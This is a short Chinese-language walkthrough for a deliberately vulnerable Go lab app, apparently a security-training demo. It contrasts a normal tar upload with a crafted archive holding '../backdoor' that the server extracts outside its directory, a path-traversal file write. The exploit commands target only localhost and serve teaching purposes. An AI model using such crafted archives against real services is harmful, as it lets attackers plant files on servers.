# 正常使用时

```
➜  vuln-go-app tar -czvf normal.tar.gz main.go
a main.go
```

```
➜  vuln-go-app curl -F'file=@normal.tar.gz' 127.0.0.1:8089/unsafe/decompress_tar
```

# 恶意攻击
制作恶意tar包
```
➜  vuln-go-app touch ../backdoor
➜  vuln-go-app tar -P -f evil.tar.gz -zcv ../backdoor
a ../backdoor
➜  vuln-go-app rm ../backdoor
```

上传压缩包后，服务端会解压压缩包，并且会把backdoor解压到上级目录。
```
curl -F'file=@evil.tar.gz' 127.0.0.1:8089/unsafe/decompress_tar
```
